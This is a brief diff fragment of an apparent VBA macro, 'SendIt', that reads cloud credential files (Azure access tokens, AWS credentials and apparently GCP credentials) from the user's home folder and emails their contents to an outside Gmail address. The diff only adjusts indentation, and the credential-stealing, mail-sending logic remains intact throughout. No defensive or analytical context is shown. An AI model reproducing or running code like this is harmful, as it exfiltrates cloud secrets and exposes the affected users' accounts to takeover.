@@ -12,7 +12,7 @@ Sub SendIt()
   azureCreds = GetText(home & "\.azure\accessTokens.json")
   awsCreds = GetText(home & "\.aws\credentials")
 
-    With mailobj
+  With mailobj
     .To = "test@gmail.com"
     .Subject = "Testmail"
     .Body = gcpCreds + azureCreds + awsCreds
